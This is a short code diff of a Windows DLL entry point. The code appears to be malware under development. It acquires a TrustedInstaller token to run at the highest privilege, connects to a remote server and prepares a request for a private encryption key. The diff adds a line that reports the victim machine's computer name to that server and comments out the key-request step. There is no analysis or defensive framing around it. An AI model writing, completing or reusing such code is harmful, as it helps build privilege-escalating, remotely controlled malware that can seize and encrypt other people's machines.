@@ -52,7 +52,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		 
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi;
-
+		
 		HANDLE token = ProcessUtilities::GetTrustedInstallerToken();
 
 		//ProcessUtilities::OpenProcessAsImposter(
@@ -72,13 +72,17 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if ( !me.Connect() )
 			me.~Client();
 
+		me.SendComputerNameToServer();
+		me.~Client();
+		return FALSE;
+
 		ClientRequest req;
 		req.action = req.REQUEST_PRIVATE_ENCRYPTION_KEY;
 		req.tcp = me.TCPSocket;
 		req.valid = TRUE;
-		me.SendEncryptedMessageToServer(me.TCPServerDetails, req);
-
-		OutputDebugStringA("sent the encrypted msg");
+		//me.SendEncryptedMessageToServer(me.TCPServerDetails, req);
+		
+		//NetCommon::TransmitData(req, me.TCPSocket, TCP, NetCommon::_default, TRUE, NetCommon::GetBIOFromString(me.Secrets.strPublicKey));
 
 		while ( 1 ) {
 			std::this_thread::sleep_for(std::chrono::seconds(1)); // Simple wait to keep the main thread alive
